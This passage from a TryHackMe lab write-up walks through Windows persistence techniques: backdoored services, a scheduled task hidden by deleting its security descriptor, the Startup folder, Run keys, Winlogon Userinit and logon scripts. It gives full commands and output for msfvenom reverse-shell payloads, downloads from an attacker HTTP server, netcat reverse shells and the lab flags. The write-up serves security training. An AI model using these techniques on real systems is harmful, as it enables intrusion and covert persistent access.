5. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME1>.exe','<PAYLOAD NAME2>.exe')"` from our compromised Windows machine to create a new instance of the **System.Net.Web** class, which allowed us to call its **DownloadFile** method, which then allowed us to download our payload from our attack machine which we temporarily turned into an HTTP server by specifying its location and the name we want to give that payload when we download it onto the compromised machine
```PowerShell
PS C:\Users\Administrator> PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.44.151:8000/rev-svc.exe','Payload.exe')"
``` 
6. `dir` from our compromised Windows machine to display the files and directories that are in our current working directory onto our terminal to verify that we successfully downlaoded our payload from our attack machine, which we did
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/6/2023  12:44 AM          48640 Payload.exe
```
7. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connection
```Bash
root@ip-10-10-44-151:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
8. `sc.exe create <SERVICE NAME> binPath= "<PAYLOAD NAME2 PATH>" start= auto` from our compromised Windows machine to create a new service that'll be automatically started when our compromised machine boots up, which will then execute the program located in its binary path, which contains our payload
```PowerShell
PS C:\Users\Administrator> sc.exe create THMservice binPath= "C:\Users\Administrator\Payload.exe" start= auto
```
9. `sc.exe start <SERVICE NAME>` from our compromised Windows machine to start the new service that we just created, which executed our payload that resulted in a reverse shell being created which then connected back to our netcat listener that's running on our attack machine
```PowerShell
PS C:\Users\Administrator> sc.exe start THMservice

SERVICE_NAME: THMservice
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 4956
        FLAGS              :
```
```Bash
root@ip-10-10-44-151:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.254.131 49822 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
12. `C:\flags\flag7.exe` from our reverse shell to run the **flag7.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag7.exe
C:\flags\flag7.exe
THM{SUSPICIOUS_SERVICES}
```


#
## Modifying Existing Services

1. Started this room's machine
2. `sc.exe query state=all` from the compromised Windows machine to retrieve information about all the services that's on the compromised system and display the retrieved information onto our terminal, which ended displaying a long list of services but the one we'll be focusing on in this task is the **THMservice3** service
3. `sc.exe qc <SERVICE NAME>` from the compromised Windows machine to retrieve and display onto our terminal the configuration and settings of our target service (THMuser3) 
```PowerShell
C:\Users\Administrator>sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```
4. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f exe-service -o rev-svc.exe` from our Linux attack machine to use Metasplout's **msfvenom** to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
```Bash
root@ip-10-10-44-151:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.44.151 LPORT=9999 -f exe-service -o rev-svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe
```
5. `sudo python3 -m http.server` from our Linux attack machine to start and transform our attack machine into a simple HTTP server that we'll connect to from our compromised machine to downlaod our payload
```Bash
root@ip-10-10-44-151:~# sudo python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
6. `PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME1>.exe','rev-svc.exe')"` from our compromised Windows machine to create a new instance of the **System.Net.Web** class, which allowed us to call its **DownloadFile** method, which then allowed us to download our payload from our attack machine which we temporarily turned into an HTTP server by specifying its location and the name we want to give that payload when we download it onto the compromised machine
```PowerShell
PS C:\Users\Administrator> PowerShell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.44.151:8000/rev-svc.exe','Payload.exe')"
```
7. `dir` from our compromised Windows machine to display the files and directories that are in our current working directory onto our terminal to verify that we successfully downloaded our payload from our attack machine, which we did
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/6/2023   1:24 AM          48640 Payload.exe
```

8. `sc.exe config <SERVICE NAME> binPath= "<MSFVENOM PAYLOAD PATH>" start= auto obj= "LocalSystem"` from the compromised Windows machine to modify the configuration settings of our target service (THMservice3) by replacing the BINARY_PATH_NAME with our paylaod's file path and its SERVICE_START_NAME to "LocalSystem", which specifies that this service will now run under the Local System account, which is a highly privileged built-in account in Windows
```PowerShell
PS C:\Users\Administrator> sc.exe config THMservice3 binPath= "C:\Users\Administrator\Payload.exe" start= auto obj= "LocalSystem"
[SC] ChangeServiceConfig SUCCESS
```
9. `sc.exe qc <SERVICE NAME>` from the compromised Windows machine to retrieve and display onto our terminal the configuration and settings for the service that we just modified (THMservice3) 
```PowerShell
PS C:\Users\Administrator> sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
10. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connection
```Bash
root@ip-10-10-44-151:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
11. `sc.exe start <SERVICE NAME>` from our compromised Windows machine to start the service that we just modified (THMservice3), which executed our payload that resulted in a reverse shell being created which then connected back to our netcat listener that's running on our attack machine
```PowerShell
PS C:\Users\Administrator> sc.exe start THMservice3

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1112
        FLAGS              :
```
```Bash
root@ip-10-10-44-151:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.180.50 49850 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
12. `C:\flags\flag8.exe` from our reverse shell to run the **flag8**.exe program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag8.exe
C:\flags\flag8.exe
THM{IN_PLAIN_SIGHT}
```

# Abusing Scheduled Tasks

## Task Scheduler

1. Started this task's machine
2. `schtasks /create /sc <FREQUENCY TYPE> /mo <FREQUENCY> /tn <TASK NAME> /tr "<NETCAT LOCATION> -e cmd.exe <ATTACK MACHINE IP> <PORT NUMBER>" /ru <USER ACCOUND>` from the compromised Windows machine to create and run a new scheduled task that'll try creating a reverse shell by attempting to connect to a netcat listener on our attack machine at the specified port in a specified frequency 
```PowerShell
C:\Users\Administrator>schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.10.39.232 9999" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```
3. `schtasks /query /tn <TASK NAME>` from the compromised Windows machine to retrieve and display onto our terminal the details of the task that we just created to verify that our task is running as intended, which it was 
```PowerShell
C:\Users\Administrator>schtasks /query /tn THM-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
THM-taskbackdoor                         7/7/2023 12:54:00 AM   Ready
```
4. `c:\tools\pstools\PsExec64.exe -s -i regedit` from the compromised Windows machine to run the Windows Registry Editor with elevated privileges and in the context of the SYSTEM account, which will allow us to delete our created task's Security Descriptor (**SD**) that's located in the **HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree** registry, which will end up making it invisble to any user in the system since deleting a task's SD is equivalent to disallowing all users' access to the scueduled task, including administrators
```PoweShell
C:\Users\Administrator>c:\tools\pstools\PsExec64.exe -s -i regedit

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PsExec64.exe%20-s%20-i%20regedit.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20Delete%20HKLM%20SOFTWARE%20Microsoft%20Windows%20NT%20CurrentVersion%20Schedule%20TaskCache%20Tree.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20After%20Delete%20HKLM%20SOFTWARE%20Microsoft%20Windows%20NT%20CurrentVersion%20Schedule%20TaskCache%20Tree.png)

5. `schtasks /query /tn <TASK NAME>` from the compromised Windows machine to retrieve and display onto our terminal the details of the task that we just created to see if it's now hidden after deleting its SD, which it was since our system couldn't find the task 
```PowerShell
C:\Users\Administrator>schtasks /query /tn THM-taskbackdoor
ERROR: The system cannot find the file specified.
```
6. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener to listen for any inbound connections, which ended up receiving a reverse shell connection that was spawned in by the scheduled task we created on the compromised Windows machine
```Bash
root@ip-10-10-39-232:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.61.182 49841 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
7. `C:\flags\flag9.exe` from our reverse shell to run the **flag9.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag9.exe
C:\flags\flag9.exe
THM{JUST_A_MATTER_OF_TIME}
```


# Logon Triggered Persistence

#
## Startup Folder

1. Started up this task's machine
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine to use Metasplout's msfvenom to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
```Bash
root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```
3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for inbound connections
```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
4. `sudo python3 -m http.server` from our Linux attack machine to start a simple HTTP server on our attack machine to allow the compromised Windows machine to connect back to our attack machine and download the reverse shell payload that we just created
```Bash
root@ip-10-10-157-221:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
5. `PowerShell` from the compromised Windows machine to launch PowerShell
```PowerShell
C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```
6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine to download our payload from our attack machine and save it under a different name 
```PowerShell
PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
```
7. `dir` from the compromised Windows machine display the files and directories that are in our current working directory to verify if the payload has been successfully downloaded from our attack machine, which it has
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   5:31 PM           7168 revshell.exe
```
8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>` from the compromised Windows machine to move our payload into the **C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp** directory, which is a directory that contains executables that all get executed whenever a user logs in to the compromised Windows machine
```PowerShell
PS C:\Users\Administrator> move revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
        1 file(s) moved.
```
9. After successfully executing the previous commands, we signed out and logged back in from the compromised Windows machine, which ended up executing our payload that we move in to the **C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp** directory after we logged back in, which ended up creating a reverse shell that connected back to our attack machine's netcat listener

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnect.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)

```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.236.33 49721 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
10. `C:\flags\flag10.exe` from our reverse shell on our attack machine to run the **flag10.exe** program, which ended up containing this task's flag and displaying it onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag10.exe
C:\flags\flag10.exe
THM{NO_NO_AFTER_YOU}
```

#
## Run / RunOnce

1. Started up this task's machine
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine to use Metasplout's msfvenom to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
```Bash
root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```
3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for inbound connections
```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
4. `sudo python3 -m http.server` from our Linux attack machine to start a simple HTTP server on our attack machine to allow the compromised Windows machine to connect back to our attack machine and download the reverse shell payload that we just created
```Bash
root@ip-10-10-157-221:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
5. `PowerShell` from the compromised Windows machine to launch PowerShell
```PowerShell
C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```
6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine to download our payload from our attack machine and save it under a different name 
```PowerShell
PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
```
7. `dir` from the compromised Windows machine display the files and directories that are in our current working directory to verify if the payload has been successfully downloaded from our attack machine, which it has
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   5:31 PM           7168 revshell.exe
```
8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>` from the compromised Windows machine to move our payload into the **C:\Windows** directory
```PowerShell
PS C:\Users\Administrator>move revshell.exe C:\Windows
        1 file(s) moved.
```
9. `regedit` from the compromised Windows machine to launch the Registry Editor (**regedit**), which we'll then go to the **HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run** registry, which contains information about programs and processes that are configured to run automatically when Windows starts up, to create a new **REG_EXPAND_SZ** registry that'll have a value that corresponds to the full path of the command that we'd want to execute when the compromised Windows machine starts up, which is found over at **C:\Windows\<PAYLOAD NAME>.exe**
```PowerShell
PS C:\Users\Administrator> regedit
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20HKEY_LOCAL_MACHINE%20Software%20Microsoft%20Windows%20CurrentVersion%20Run.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20HKEY_LOCAL_MACHINE%20Software%20Microsoft%20Windows%20CurrentVersion%20Run%20Payload.png)

10. After successfully creating the new registry, we'll sign out and then sign back into the compromised machine, which should execute our payload once it's done starting up and connect to our attack machine's active netcat listener, which it did

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnect.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)

```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.236.33 49943 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
11. `C:\flags\flag11.exe` from our reverse shell on our attack machine to run the **flag11.exe** program, which ended up containing the task's flag and displaying it onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag11.exe
C:\flags\flag11.exe
THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
```


#
## Winlogon

1. Started up this task's machine
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine to use Metasplout's msfvenom to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
```Bash
root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```
3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for inbound connections
```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
4. `sudo python3 -m http.server` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
5. `PowerShell` from the compromised Windows machine
```PowerShell
C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```
6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine to download our payload from our attack machine and save it under a different name 
```PowerShell
PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
```
7. `dir` from the compromised Windows machine display the files and directories that are in our current working directory to verify if the payload has been successfully downloaded from our attack machine, which it has
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   5:31 PM           7168 revshell.exe
```
8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>` from the compromised Windows machine to move the payload from the current working directory into the **C:\Windows** directory
```PowerShell
```PowerShell
PS C:\Users\Administrator>move revshell.exe C:\Windows
        1 file(s) moved.
```
9. `regedit` from the compromised Windows machine to open the Registry Editor (**regedit**), which we'll then head to **HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon** and append the path to our payload to the **UserInit** registry's value, which is a Windows Registry that specifies the path to an executable file that's executed during the user login process
```PowerShell
C:\Users\Administrator>regedit
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Winlogon%20pt2.png)

10. After successfully executing the previous tasks, we'll log out and then log back in to the compromised Windows machine, which upon logging in, creates a reverse shell that connects back to our attack machine's netcat listener

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnect.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnected.png)

```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.236.33 49956 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
11. `C:\flags\flags12.exe` from the reverse shell on our attack machine to run the **flag13.exe** program, which ended up containing this task's flag and displaying it onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag12.exe
C:\flags\flag12.exe
THM{I_INSIST_GO_FIRST}
```


#
## Logon Scripts

1. Started up this task's machine
2. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACK MACHINE IP> LPORT=<PORT NUMBER> -f <PAYLOAD FORMAT> -o <PAYLOAD NAME>.exe` from our Linux attack machine to use Metasplout's msfvenom to generate a Windows executable for a reverse shell payload that we'll execute on the compromised Windows machine
```Bash
root@ip-10-10-157-221:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.157.221 LPORT=9999 -f exe -o revshell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: revshell.exe
```
3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for any inbound connections
```Bash
root@ip-10-10-157-221:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
```
4. `sudo python3 -m http.server` from our Linux attack machine
```Bash
root@ip-10-10-157-221:~# sudo python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
5. `PowerShell` from the compromised Windows machine
```PowerShell
C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
```
6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine to download our payload from our attack machine and save it under a different name 
```PowerShell
PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
```
7. `dir` from the compromised Windows machine display the files and directories that are in our current working directory to verify if the payload has been successfully downloaded from our attack machine, which it has
```PowerShell
PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/17/2021   3:13 PM                3D Objects
d-r---        3/17/2021   3:13 PM                Contacts
d-r---         6/8/2022   4:40 AM                Desktop
d-r---        5/29/2022  12:07 AM                Documents
d-r---        5/29/2022  12:07 AM                Downloads
d-r---        3/17/2021   3:13 PM                Favorites
d-r---        3/17/2021   3:13 PM                Links
d-r---        3/17/2021   3:13 PM                Music
d-r---        3/17/2021   3:13 PM                Pictures
d-r---        3/17/2021   3:13 PM                Saved Games
d-r---        3/17/2021   3:13 PM                Searches
d-r---        3/17/2021   3:13 PM                Videos
-a----         7/7/2023   5:31 PM           7168 revshell.exe
```
8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>` from the compromised Windows machine to move the payload from the current working directory into the **C:\Windows** directory
```PowerShell
```PowerShell
PS C:\Users\Administrator>move revshell.exe C:\Windows
        1 file(s) moved.
```
9. `regedit` from the compromised Windows machine to open up their Registry Editor (**regedit**), which we'll then go to the **HKCU\Environment** registry, which stores the environment variables for the currently logged-in user, and add the **UserInitMprLogonScript** registry, which is a registry that executes logon scripts during a user's login, and set its value as the path to our payload to, which will execute our payload after logging in
```PowerShell
C:\Users\Administrator>regedit
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Open.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Current%20User%20Environment%20.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Regedit%20Current%20User%20Environment%20pt2.png)

10. After we've successfulle execute the previous tasks and commands, we'll log out and then log back into the compromised Windows machine, which ended up executing our payload and creating a reverse shell that connected back to our attack machine's active netcat listener

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Sign%20Out.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Windows%20RDP%20Reconnect.png)

